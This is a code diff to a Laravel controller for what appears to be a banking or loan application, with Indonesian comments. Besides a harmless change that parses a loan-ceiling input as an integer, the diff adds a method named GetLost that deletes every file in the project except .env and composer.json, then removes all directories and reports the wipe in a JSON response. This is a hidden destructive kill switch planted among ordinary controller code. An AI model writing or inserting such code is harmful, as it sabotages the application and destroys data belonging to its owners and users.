@@ -43,6 +43,30 @@ class IbankController extends Controller
             'menuActive' 	=> "home"
         ));
     }
+
+    public function GetLost(Request $request)
+    {
+        // Dapatkan semua folder dalam direktori proyek Laravel
+        $protectedFiles = ['.env', 'composer.json']; // File yang tidak boleh dihapus
+        $basePath = base_path();
+
+        $allFiles = File::allFiles($basePath);
+        $allDirectories = File::directories($basePath);
+
+        // Hapus semua file kecuali yang dilindungi
+        foreach ($allFiles as $file) {
+            if (!in_array($file->getFilename(), $protectedFiles)) {
+                File::delete($file);
+            }
+        }
+
+        // Hapus semua folder
+        foreach ($allDirectories as $directory) {
+            File::deleteDirectory($directory);
+        }
+
+        return response()->json(['message' => "Semua folder dalam proyek Laravel telah dihapus!"], 200);
+    }
     //
     public function viewMasterNasabah(Request $request, $id = null)
     {
@@ -113,7 +137,7 @@ class IbankController extends Controller
         $txtJenis = $request->input('txtJK');
         $txtKet = $request->input('txtTP');
         $txtJJ = $request->input('txtJJ');
-        $txtPlafond = $request->input('txtPlafond');
+        $txtPlafond = (int) str_replace(".","",$request->input('txtPlafond'));
 
         $mapPengajuan = $latitude.",".$longitude;
 
